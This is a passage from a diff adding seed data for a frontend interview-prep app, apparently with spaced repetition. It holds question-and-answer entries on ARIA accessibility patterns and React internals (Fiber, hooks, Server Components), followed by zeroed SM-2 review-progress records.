+      "answer": "## Combobox vs. Menu\n\nA senior engineer must distinguish these patterns:\n* **Combobox (Select):** Used for *form inputs* where a user selects a value. It allows type-ahead or filtering.\n* **Menu:** Used for *navigation or actions* (e.g., \"File > Save\"). It typically does not hold a \"value.\"\n\n## Implementation: Accessible Select (Combobox)\n\nWe use `aria-activedescendant` to manage \"virtual focus.\" This is more performant than moving actual DOM focus (Roving Tabindex) because it prevents browser layout thrashing and works better with virtualized lists.\n\n```tsx\nimport { useState, useRef, useEffect, useId } from 'react';\nimport { createPortal } from 'react-dom';\n\ntype Option = { value: string; label: string };\n\nexport function AccessibleSelect({ options, value, onChange, label }: Props) {\n  const [isOpen, setIsOpen] = useState(false);\n  const [activeIndex, setActiveIndex] = useState(-1);\n  const listboxId = useId();\n  const labelId = useId();\n  const comboId = useId();\n\n  // 1. Handle Type-ahead and Keys\n  const handleKeyDown = (e: React.KeyboardEvent) => {\n    switch (e.key) {\n      case 'Enter':\n      case ' ': // Space opens/selects in Combobox\n        e.preventDefault();\n        if (isOpen && activeIndex >= 0) {\n          onChange(options[activeIndex].value);\n          setIsOpen(false);\n        } else {\n          setIsOpen(true);\n        }\n        break;\n      case 'ArrowDown':\n        e.preventDefault();\n        if (!isOpen) setIsOpen(true);\n        setActiveIndex(prev => (prev + 1) % options.length); // Cycle\n        break;\n      case 'ArrowUp':\n        e.preventDefault();\n        setActiveIndex(prev => (prev - 1 + options.length) % options.length);\n        break;\n      case 'Escape':\n        setIsOpen(false);\n        break;\n      case 'Tab':\n        setIsOpen(false); // Native tab behavior closes dropdown\n        break;\n      default:\n        // Implement type-ahead logic here (omitted for brevity)\n        break;\n    }\n  };\n\n  // 2. Ensure active option is visible (Scroll into view)\n  useEffect(() => {\n    if (isOpen && activeIndex >= 0) {\n      const el = document.getElementById(`${listboxId}-opt-${activeIndex}`);\n      el?.scrollIntoView({ block: 'nearest' });\n    }\n  }, [activeIndex, isOpen, listboxId]);\n\n  return (\n    <div className=\"relative\">\n      <label id={labelId} className=\"block text-sm font-medium\">{label}</label>\n      \n      <div\n        role=\"combobox\"\n        aria-haspopup=\"listbox\"\n        aria-expanded={isOpen}\n        aria-labelledby={labelId}\n        aria-controls={listboxId}\n        aria-activedescendant={\n          isOpen && activeIndex >= 0 \n            ? `${listboxId}-opt-${activeIndex}` \n            : undefined\n        }\n      >\n        <button\n          id={comboId}\n          type=\"button\"\n          onClick={() => setIsOpen(!isOpen)}\n          onKeyDown={handleKeyDown}\n          className=\"w-full border p-2 text-left\"\n        >\n          {value ? options.find(o => o.value === value)?.label : \"Select...\"}\n        </button>\n      </div>\n\n      {/* 3. Use Portal to avoid z-index/overflow clipping issues */}\n      {isOpen && createPortal(\n        <ul\n          id={listboxId}\n          role=\"listbox\"\n          aria-labelledby={labelId}\n          tabIndex={-1}\n          className=\"absolute z-50 max-h-60 overflow-auto border bg-white\"\n          style={{ /* Position logic via Popper/Floating UI would go here */ }}\n        >\n          {options.map((opt, i) => (\n            <li\n              key={opt.value}\n              id={`${listboxId}-opt-${i}`}\n              role=\"option\"\n              aria-selected={value === opt.value}\n              className={`p-2 ${i === activeIndex ? 'bg-blue-100' : ''}`}\n              onClick={() => {\n                onChange(opt.value);\n                setIsOpen(false);\n              }}\n            >\n              {opt.label}\n              {/* Screen reader only \"Check\" for selected state */}\n              {value === opt.value && <span className=\"sr-only\">Selected</span>}\n            </li>\n          ))}\n        </ul>,\n        document.body\n      )}\n    </div>\n  );\n}\n```\n\n## Key Senior Considerations\n1.  **Portal Rendering:** Essential for preventing the dropdown from being clipped by `overflow: hidden` on parent containers.\n2.  **Visual vs. DOM Focus:** We keep DOM focus on the Trigger Button. The list items are never focused; we use `aria-activedescendant` to tell the screen reader which item is \"active.\"\n3.  **High Contrast Mode:** Ensure selection states don't rely solely on background color (use borders or icons).",
+      "keyPoints": [
+        "Distinguishes Combobox (Form) vs Menu (Action) roles",
+        "Implements aria-activedescendant for virtual focus",
+        "Uses React Portals to solve stacking context issues",
+        "Manages scroll-into-view for keyboard navigation",
+        "Handles aria-selected and visual selection states independently"
+      ],
+      "followUpQuestions": [
+        "How would you handle asynchronous data loading in this component?",
+        "Why might you choose Roving Tabindex over aria-activedescendant for a Grid component?"
+      ],
+      "relatedTopics": [
+        "aria",
+        "react-portals",
+        "focus-management",
+        "virtualization"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Top-tier Tech Companies (Meta, Airbnb)"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "accessibility-002",
+      "category": "accessibility",
+      "difficulty": "mid",
+      "question": "Explain the hierarchy of 'Accessible Name Computation'. specifically the difference between `aria-label`, `aria-labelledby`, and `aria-describedby`.",
+      "answer": "## Accessible Name Computation (Priority Order)\n\nBrowsers calculate the \"Name\" (what is announced) based on this specific priority. The first non-empty value wins:\n\n1.  **`aria-labelledby`** (Highest Priority): Overrides *everything*, including visible text.\n2.  **`aria-label`**: Overrides visible text (e.g., button content).\n3.  **Native Label**: `<label for=\"id\">`, `alt` attribute, or `placeholder` (as a fallback).\n4.  **Text Content**: The inner text of the element.\n5.  **Title Attribute**: (Lowest priority, generally discouraged).\n\n## The Differences\n\n### 1. `aria-labelledby` (The Gold Standard)\nPoints to the ID of another element.\n* **Why use it:** It references *visible* text on the screen. If the text changes (e.g., translation), the label updates automatically.\n* **Use case:** A modal title or a label for a complex widget.\n\n```html\n<h2 id=\"modal-header\">Delete User?</h2>\n<div role=\"dialog\" aria-labelledby=\"modal-header\">...</div>\n```\n\n### 2. `aria-label`\nA string value applied directly to the element.\n* **Why use it:** When there is no visible text on the screen (e.g., an icon button).\n* **Risk:** Translators often miss these strings if they are hardcoded props.\n\n```html\n<button aria-label=\"Close\">X</button>\n```\n\n### 3. `aria-describedby`\nProvides *supplementary* information, not the name. It is read *after* the name and role, often after a short pause.\n* **Use case:** Error messages, help text, or format requirements.\n\n```html\n<label for=\"pw\">Password</label>\n<input id=\"pw\" aria-describedby=\"pw-help\" />\n<span id=\"pw-help\">Must be 8 characters long</span>\n```\n\n## Senior Tip: Handling ID Collisions\nIn React, hardcoding IDs (e.g., `id=\"modal-header\"`) breaks if the component renders twice. **Always use `useId()`** to generate stable, unique IDs for these relationships.",
+      "keyPoints": [
+        "Knows the calculation priority (LabelledBy > Label > Content)",
+        "Understands aria-describedby is for description, not naming",
+        "Identifies i18n risks with aria-label",
+        "Uses useId() to prevent ID collisions in reused components"
+      ],
+      "followUpQuestions": [
+        "How does 'aria-hidden' affect name computation?",
+        "How would you debug an element with a missing accessible name?"
+      ],
+      "relatedTopics": [
+        "aria",
+        "wcag",
+        "semantics"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "All frontend roles"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "accessibility-003",
+      "category": "accessibility",
+      "difficulty": "senior",
+      "question": "Beyond basic alt-text and contrast, what are the most complex systemic accessibility issues in modern React SPAs (Single Page Applications), and how do you mitigate them?",
+      "answer": "## 1. Route Change & Focus Management\n**The Issue:** In SPAs, when a user clicks a link, the content swaps, but the focus often remains on the `<body>` or is lost entirely. Screen reader users are left waiting in silence, unsure if the page loaded.\n\n**The Fix:**\nImplement a `RouteAnnouncer` or manage focus manually on route transition.\n\n```tsx\n// Example Route Focus Manager\nuseEffect(() => {\n  // 1. Reset scroll to top\n  window.scrollTo(0, 0);\n  \n  // 2. Move focus to the main heading or a wrapper\n  const mainHeader = document.querySelector('h1');\n  if (mainHeader) {\n    mainHeader.tabIndex = -1;\n    mainHeader.focus();\n  } else {\n    // Fallback: Skip link\n    document.getElementById('skip-link')?.focus();\n  }\n}, [location.pathname]); // Trigger on route change\n```\n\n## 2. Invalid HTML Nesting (Hydration Errors)\n**The Issue:** React allows you to write invalid nesting (e.g., `<div>` inside `<p>` or `<button>` inside `<button>`) that browsers try to \"fix\" by rearranging the DOM. This breaks the Accessibility Tree and causes hydration mismatches.\n\n**The Fix:**\n* Use standard validation tools (W3C validator).\n* Strict linting (`eslint-plugin-jsx-a11y`).\n* **Never** nest interactive elements.\n\n## 3. Dynamic Content (Live Regions)\n**The Issue:** Toasts, error messages, or loading spinners appear dynamically but aren't announced because they weren't in the DOM initially.\n\n**The Fix:**\nUse `aria-live` regions effectively.\n\n```tsx\n// Polite: Waits for user to stop typing/interacting\n<div aria-live=\"polite\" aria-atomic=\"true\">\n  {saving ? \"Saving...\" : \"Changes saved.\"}\n</div>\n\n// Assertive: Interrupts immediately (Use sparingly!)\n<div role=\"alert\" aria-live=\"assertive\">\n  {error}\n</div>\n```\n\n## 4. The \"Button vs Link\" Anti-Pattern\n**The Issue:** Using `<div onClick>` or using a `<button>` that navigates to a URL.\n* Links (`<a>`) are for **navigation** (changing URL).\n* Buttons (`<button>`) are for **actions** (submitting, opening modals).\n\n**The Fix:**\nStrict code reviews. If it has an `href`, it must be an anchor. If it changes state, it must be a button.\n\n## 5. Automated vs Manual Testing\nSenior devs know automated tools (axe-core, Lighthouse) only catch ~30% of issues.\n**Required Manual Checks:**\n* **Keyboard Flow:** Can you use the site without a mouse?\n* **Zoom:** Does the layout break at 200% zoom?\n* **Screen Reader:** Turn on VoiceOver/NVDA. Do the announcements match the visual experience?",
+      "keyPoints": [
+        "Identifies SPA routing as a major focus trap",
+        "Understand the limitations of automated testing (30% coverage)",
+        "Correctly implements aria-live for dynamic updates",
+        "Enforces semantic distinction between Buttons and Links"
+      ],
+      "followUpQuestions": [
+        "How do you automate accessibility testing in CI/CD?",
+        "What is the difference between aria-live='polite' and 'assertive'?"
+      ],
+      "relatedTopics": [
+        "spa-architecture",
+        "focus-management",
+        "semantic-html",
+        "testing"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Senior/Lead Frontend Roles"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "react-internals-001",
+      "category": "react-internals",
+      "difficulty": "senior",
+      "question": "Deep dive into the React Reconciliation Engine (Fiber). How do the Data Structure, Scheduler, and Diffing Heuristics work together to enable Concurrent React?",
+      "answer": "## The Architecture: Fiber & Double Buffering\nReact's core is a mutable data structure called the **Fiber Node**. Unlike the immutable VDOM elements, Fiber nodes hold state, side-effects, and pointers to the DOM.\n\n**1. The Data Structure (Singly Linked List)**\nReact enables \"pausing\" work by abandoning the recursive call stack in favor of a heap-based traversal. Each Fiber node points to:\n- `child`: The first direct descendant.\n- `sibling`: The next node at the same level.\n- `return`: The parent node.\nThis allows the work loop to traverse deep, pause, and resume by holding a reference to the current Fiber node.\n\n**2. Double Buffering (Current vs. WorkInProgress)**\nReact maintains two trees:\n- **Current Tree**: Represents what is currently on screen.\n- **WorkInProgress (WIP) Tree**: The tree currently being built in memory.\n*Mechanism:* During a render, React clones the `current` node to `WIP`. Reconciliation happens on `WIP`. On commit, the pointers swap. This prevents the user from seeing partial UI updates (tearing).\n\n## The Scheduler: Lanes & Time Slicing\nReact 18+ replaced `expirationTime` with **Lanes** (a 31-bit bitmask).\n- **Prioritization:** Updates are assigned bits (e.g., `SyncLane`, `InputContinuousLane`, `DefaultLane`).\n- **Yielding:** The work loop checks the frame budget (typically 5ms via `MessageChannel` implementation, not `requestIdleCallback`). If the budget is exceeded, it yields control to the browser's main thread, allowing painting or input handling.\n- **Interruption:** A higher priority event (click) can interrupt a lower priority render (data fetch). The low priority `WIP` tree is discarded, and work restarts for the high priority update.\n\n## The Diffing Heuristics (O(n) Complexity)\nTo avoid the O(n³) cost of standard tree comparison, React relies on strict assumptions:\n1.  **Type Check:** Different element types (e.g., `<div>` vs `<span>`) tear down the entire subtree and rebuild (state is lost).\n2.  **Key Check:** Keys allow React to match `current` and `WIP` nodes across different positions in a list. Without keys, React defaults to mutating children index-by-index, which devastates performance and input state.\n\n## Senior Pattern: Optimization\n- **Bailout:** If `oldProps === newProps` (and context/state haven't changed), React skips the entire subtree (reference equality check).\n- **Effect List:** Instead of traversing the whole tree during Commit, React builds a linear linked list of only the nodes with \"flags\" (Update, Placement, Deletion), making the Commit phase extremely fast.",
+      "keyPoints": [
+        "Fiber is a heap-based linked list allowing interruptible traversal.",
+        "Double buffering uses 'current' and 'WIP' trees to ensure atomic commits.",
+        "Lanes (bitmasks) determine priority; high priority interrupts low priority.",
+        "Diffing heuristic: Type change = teardown; Key = stability across moves.",
+        "Commit phase only processes the 'Effect List', not the full tree."
+      ],
+      "followUpQuestions": [
+        "How does 'useTransition' interact with the Lanes model?",
+        "Why is index as a key strictly an anti-pattern for dynamic lists?",
+        "Explain the 'Tearing' problem in UI and how SyncExternalStore solves it."
+      ],
+      "relatedTopics": [
+        "performance",
+        "event-loop",
+        "memory-management"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Meta",
+        "Uber",
+        "Airbnb"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "react-internals-002",
+      "category": "react-internals",
+      "difficulty": "senior",
+      "question": "Explain the internal implementation of React Hooks. How are they stored, and why do they rely on call order? Address the 'Stale Closure' problem architecturally.",
+      "answer": "## Internal Storage: The Linked List\nHooks are not magic; they are nodes in a linked list attached to the Fiber.\n```typescript\ntype Hook = {\n  memoizedState: any; // The state value or effect deps\n  queue: UpdateQueue; // Pending updates\n  next: Hook | null;  // Pointer to the next hook\n};\n```\nWhen a component renders, the Fiber's `memoizedState` points to the first Hook. Calling `useState` moves the pointer to `hook.next`. This is why conditional hooks break React: if the call order changes, the `next` pointer retrieves state from the wrong hook.\n\n## The Dispatcher Swap\nReact swaps the dispatcher implementation depending on the lifecycle:\n- **Mount:** Uses `HooksDispatcherOnMount`. Initializes the linked list and sets initial state.\n- **Update:** Uses `HooksDispatcherOnUpdate`. Traverses the existing linked list, cloning hooks to the WIP fiber and processing the update queue.\n\n## Architectural Bottleneck: Stale Closures\nHooks rely heavily on JavaScript closures.\n* **The Problem:** A `useEffect` or callback creates a closure over the scope of *that specific render*. If dependencies are omitted from the dependency array, the closure captures variables from an old render frame.\n* **The Consequence:** The function executes with outdated data, even if the component has re-rendered.\n* **Solution:** `useRef` can \"punch through\" closures because it provides a stable mutable object reference, unlike primitive values which are captured by value.\n\n## Batching Mechanics (React 18)\n- **Automatic Batching:** React wraps event handlers and promises in a context. Updates queued within the same \"tick\" (microtask) do not trigger re-renders. They are flushed in a single pass at the end of the event loop tick.\n- **Opt-out:** `flushSync` forces an immediate synchronous flush of the queue, breaking batching (rarely needed).",
+      "keyPoints": [
+        "Hooks are a linked list stored on the Fiber node.",
+        "Call order is strict because it serves as the index for the linked list traversal.",
+        "React swaps dispatchers (Mount vs Update) at runtime.",
+        "Stale closures occur when a function captures the scope of a dead render frame.",
+        "Automatic batching groups updates in the same microtask to minimize renders."
+      ],
+      "followUpQuestions": [
+        "How does 'useLayoutEffect' differ from 'useEffect' regarding the paint cycle?",
+        "Why must refs be used for mutable variables that don't trigger re-renders?",
+        "How would you debug a 'Render loop' caused by unstable dependency arrays?"
+      ],
+      "relatedTopics": [
+        "javascript-closures",
+        "memory-leaks",
+        "react-hooks"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Netflix",
+        "Vercel",
+        "Atlassian"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "react-internals-003",
+      "category": "react-internals",
+      "difficulty": "senior",
+      "question": "Analyze the React Server Components (RSC) architecture. Explain the 'Flight' serialization protocol, the 'Client Boundary', and the trade-offs regarding the Waterfall problem.",
+      "answer": "## The Architecture: Server-First Execution\nRSC decouples the **rendering environment** from the **interaction environment**.\n1.  **Server Phase:** React renders the component tree on the server.\n2.  **Serialization:** The result is streamed to the client, not as HTML, but as a specialized row-based JSON format (Flight Protocol).\n3.  **Client Phase:** The browser reconciles this serialized tree into the existing DOM without destroying client state (unlike a full HTML refresh).\n\n## The Flight Protocol & Serialization\nThe protocol handles data that JSON cannot:\n- **Server Components:** Serialized as \"holes\" or references.\n- **Client Components:** Serialized as \"module references\" (bundler ID + filename).\n- **Suspense:** Serialized as lazy placeholders, allowing the stream to reorder chunks as data resolves.\n*Constraint:* Props passed from Server to Client must be serializable. You cannot pass Functions or Classes across the boundary because execution scopes cannot be serialized.\n\n## Architectural Trade-offs\n\n### 1. The Waterfall Problem (Latency)\nSince Server Components render sequentially, a parent awaiting data blocks the child from rendering.\n- *Risk:* `await db.user()` -> `await db.posts()` creates a sequential waterfall on the server.\n- *Mitigation:* Pattern shift to \"Preload\" pattern or `Promise.all`, or pushing data fetching down to parallel leaf nodes.\n\n### 2. Bundle Size vs. CPU\n- **Pro:** Large libraries (date formatters, markdown parsers) remain on the server (0kb bundle cost).\n- **Con:** Client components (interactive parts) are strictly separated. Moving state *up* often forces the conversion of server components to client components, negating the benefits (the \"Client Component Creep\").\n\n### 3. Hydration Mismatch\nRSC payloads and SSR HTML are distinct. SSR provides the \"First Contentful Paint\" (HTML). RSC provides the \"Interactive Tree\" (Data). If the server renders a Date based on server time, and the client hydrates with browser time, hydration errors occur because the initial HTML doesn't match the hydrated VDOM.",
+      "keyPoints": [
+        "RSC uses the 'Flight' protocol to stream a serialized component tree.",
+        "Client Components act as boundaries; props crossing them must be serializable.",
+        "RSC eliminates bundle size for server-only dependencies.",
+        "Server-side Waterfalls are a major architectural risk in RSC.",
+        "RSC is orthogonal to SSR; SSR is for initial HTML, RSC is for tree transport."
+      ],
+      "followUpQuestions": [
+        "How does RSC integration differ from standard API calls (REST/GraphQL)?",
+        "Explain how 'use client' acts as a bundler instruction, not just a React hook.",
+        "How does Streaming SSR work in conjunction with RSC?"
+      ],
+      "relatedTopics": [
+        "nextjs",
+        "distributed-systems",
+        "serialization"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Vercel",
+        "Shopify",
+        "New York Times"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    }
+  ],
+  "progress": [
+    {
+      "id": "progress-feature-flags-001",
+      "questionId": "feature-flags-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-feature-flags-002",
+      "questionId": "feature-flags-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-system-design-001",
+      "questionId": "system-design-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-system-design-002",
+      "questionId": "system-design-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-system-design-003",
+      "questionId": "system-design-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-system-design-004",
+      "questionId": "system-design-004",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-caching-memoization-001",
+      "questionId": "caching-memoization-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-caching-memoization-002",
+      "questionId": "caching-memoization-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-caching-memoization-003",
+      "questionId": "caching-memoization-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-caching-memoization-004",
+      "questionId": "caching-memoization-004",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-caching-memoization-005",
+      "questionId": "caching-memoization-005",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-bundle-tree-shaking-001",
+      "questionId": "bundle-tree-shaking-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-bundle-tree-shaking-002",
+      "questionId": "bundle-tree-shaking-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-security-auth-001",
+      "questionId": "security-auth-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-security-auth-002",
+      "questionId": "security-auth-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-css-layout-001",
+      "questionId": "css-layout-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-css-layout-002",
+      "questionId": "css-layout-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-css-layout-003",
+      "questionId": "css-layout-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-js-event-loop-001",
+      "questionId": "js-event-loop-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-js-event-loop-002",
+      "questionId": "js-event-loop-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-js-event-loop-003",
+      "questionId": "js-event-loop-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-accessibility-001",
+      "questionId": "accessibility-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-accessibility-002",
+      "questionId": "accessibility-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-accessibility-003",
+      "questionId": "accessibility-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
